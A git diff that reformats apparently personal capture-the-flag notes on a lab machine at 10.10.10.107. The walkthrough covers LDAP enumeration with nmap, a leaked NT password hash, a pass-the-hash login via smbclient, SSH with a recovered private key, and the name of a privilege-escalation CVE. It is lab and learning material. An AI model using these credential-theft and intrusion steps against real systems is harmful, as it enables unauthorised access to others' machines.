@@ -1,21 +1,24 @@
-10.10.10.107
+![logo](./logo.png)
 
+# USER
+
+Attempted connection to 10.10.10.107:80. But connections are refused.
+```
 80/tcp  open  http        OpenBSD httpd
-# Attempted connection to 10.10.10.107:80. But connections are refused.
+```
 
-# I think the OS is OpenBSD
-
+Lightweight Directory Access Protocol
+```
 389/tcp open  ldap        (Anonymous bind OK)
+```
 
-# What is ldap adn what can it do?
+Running
+```
+nmap -p 389 --script ldap-search 10.10.10.107
+```
 
-# Lightweight Directory Access Protocol
-
-# Running
->>> nmap -p 389 --script ldap-search 10.10.10.107
-
-# Gives
-
+Gives
+```
 PORT    STATE SERVICE
 389/tcp open  ldap
 | ldap-search: 
@@ -94,33 +97,42 @@ PORT    STATE SERVICE
 |         sambaForceLogoff: -1
 |         sambaRefuseMachinePwdChange: 0
 |_        sambaNextRid: 1001
+```
 
+Noticed that we gain a hash of a password:
 
-# Noticed that we gain a hash of a password:
+```
+sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+```
 
->>> sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+This can be used in a **pass the hash attack**
 
-# This can be used in a pass the hash attack
-
->>> 0b186e661bbdbdcf6047784de8b9fd8b
+```
+0b186e661bbdbdcf6047784de8b9fd8b
+```
 
 By using:
 
->>> smbclient \\\\10.10.10.107\\alice -U alice1978 --pw-nt-hash
+```
+smbclient \\\\10.10.10.107\\alice -U alice1978 --pw-nt-hash
+```
 
 You can use the hash as the password!!
 
-# The directory gives us a .ppk private key than can be converted to OpenSSH key using 
-  puttygen
+The directory gives us a .ppk private key than can be converted to OpenSSH key using 
 
+```
+puttygen
+```
 
-# This allows us to connect using
+This allows us to connect using
 
->>> ssh -i pk.key alive1978@10.10.10.107
+```
+ssh -i pk.key alive1978@10.10.10.107
+```
 
+# ROOT
 
-# PRIV ESC 
-
-# Weird '+' super user?
-
-# Using CVE-2018-14665 we can gain root privleges on an OpenBSD System
+```
+Using CVE-2018-14665 we can gain root privleges on an OpenBSD System
+```
